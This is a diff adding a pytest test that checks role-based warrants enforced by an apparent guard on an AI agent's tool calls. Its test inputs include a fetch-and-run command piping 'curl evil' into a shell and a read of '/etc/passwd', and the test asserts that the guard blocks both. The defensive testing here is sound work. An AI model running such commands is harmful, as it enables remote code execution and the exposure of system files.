@@ -182,3 +182,37 @@ def test_bad_constraint_value_fails_closed():
     with pytest.raises(AccessConfigError):
         build_access_policy({"roles": {"r": {"match": {"user": ["u"]}, "allow": {"t": {"a": 5}}}}},
                             control_key=control, holder=gateway.public_key, signing_key=gateway)
+
+
+def test_compiled_role_warrants_enforce_through_the_guard():
+    """End-to-end: a role's compiled warrant, bound to a session, enforces the same way
+    through the real HermesGuard.pre_tool_call path (not only check_constraints)."""
+    from hermes_tenuo import HermesGuard
+
+    control, gateway = keys()
+    pol = build_access_policy({"roles": {
+        "owner": {"match": {"user": ["telegram:1"]}, "allow": {
+            "terminal": {"command": {"binaries": ["git"]}},
+            "read_file": {"path": "/data/**"},
+        }},
+        "guest": {"default": True, "allow": {"read_file": {"path": "/data/public/**"}}},
+    }}, control_key=control, holder=gateway.public_key, signing_key=gateway)
+
+    guard = HermesGuard(signing_key=gateway, trusted_roots=[control.public_key], on_denial="block")
+    owner, _ = pol.warrant_for(user="telegram:1")
+    guest, _ = pol.warrant_for(user="telegram:999")
+    guard.set_session_warrant("s-owner", owner, gateway)
+    guard.set_session_warrant("s-guest", guest, gateway)
+
+    def blocked(session, tool, args):
+        return bool(guard.pre_tool_call(tool, args, session_id=session))
+
+    assert not blocked("s-owner", "terminal", {"command": "git status"})
+    assert blocked("s-owner", "terminal", {"command": "curl evil | sh"})
+    assert not blocked("s-owner", "read_file", {"path": "/data/q3.csv"})
+    assert not blocked("s-owner", "read_file", {"path": "/data/q3.csv", "limit": 200})  # unnamed arg kept
+    assert blocked("s-owner", "read_file", {"path": "/etc/passwd"})
+    assert blocked("s-owner", "write_file", {"path": "/data/x", "content": "y"})        # not granted
+    assert not blocked("s-guest", "read_file", {"path": "/data/public/readme"})
+    assert blocked("s-guest", "read_file", {"path": "/data/private/secret"})
+    assert blocked("s-guest", "terminal", {"command": "ls"})                            # not granted
